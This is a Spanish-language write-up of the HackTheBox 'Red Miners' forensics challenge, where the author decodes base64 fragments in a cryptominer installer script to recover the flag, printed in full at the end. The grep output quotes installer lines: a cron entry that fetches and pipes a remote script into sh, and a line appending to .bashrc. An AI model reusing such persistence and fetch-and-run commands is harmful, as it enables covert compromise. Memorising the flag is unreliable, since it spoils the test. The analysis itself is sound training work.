---
title: Red Miners
description: >
  HackTheBox Forensics Challenge - Very Easy<br>
  [Challenge Download](https://app.hackthebox.com/challenges/514)
date: 2024-05-08
weight: 10
tags: ["htb","forensics","very easy", "deobfuscation"]
---

---
# Enunciado del problema
*In the race for Vitalium on Mars, the villainous Board of Arodor resorted to desperate measures, needing funds for their mining attempts. They devised a botnet specifically crafted to mine cryptocurrency covertly. We stumbled upon a sample of Arodor's miner's installer on our server. Recognizing the gravity of the situation, we launched a thorough investigation. With you as its leader, you need to unravel the inner workings of the installation mechanism. The discovery served as a turning point, revealing the extent of Arodor's desperation. However, the battle for Vitalium continued, urging us to remain vigilant and adapt our cyber defenses to counter future threats.*

---
# Resolcución

### Leyendo el archivo .sh
Encontramos un largo archivo escrito en **bash** en el cual si nos damos cuenta hay partes fraccionadas de código *Base64* y decidimos filtrar por los caracteres: **g=\=** caracteres muy comunes en este tipo de encriptado:

```bash
cat miner_installer.sh | grep "g=="
  local url="http://tossacoin.htb/cGFydDI9Il90aDMxcl93NHkiCg=="
  dest=$(echo "X3QwX200cnN9Cg=="|base64 -d)
echo "ZXhwb3J0IHBhcnQ0PSJfdGgzX3IzZF9wbDRuM3R9Ig==" | base64 -d >> /home/$USER/.bashrc
    echo '* * * * * $LDR http://tossacoin.htb/ex.sh | sh & echo -n cGFydDE9IkhUQnttMW4xbmciCg==|base64 -d > /dev/null 2>&1'
```

Aquí vamos a obtener todo el texto en *Base64* y desencriptarlo:

```bash
$ echo -n cGFydDI9Il90aDMxcl93NHkiCg==|base64 -d
part2="_th31r_w4y"

$ echo "X3QwX200cnN9Cg=="|base64 -d
_t0_m4rs

$ echo "ZXhwb3J0IHBhcnQ0PSJfdGgzX3IzZF9wbDRuM3R9Ig==" | base64 -d
export part4="_th3_r3d_pl4n3t}"

$ echo -n cGFydDE9IkhUQnttMW4xbmciCg==|base64 -d 
part1="HTB{m1n1ng"
```

Si juntamos todo con el orden marcado nos devuelve la cadena de texto -> `HTB{m1n1ng_th31r_w4y_t0_m4rs_th3_r3d_pl4n3t}    `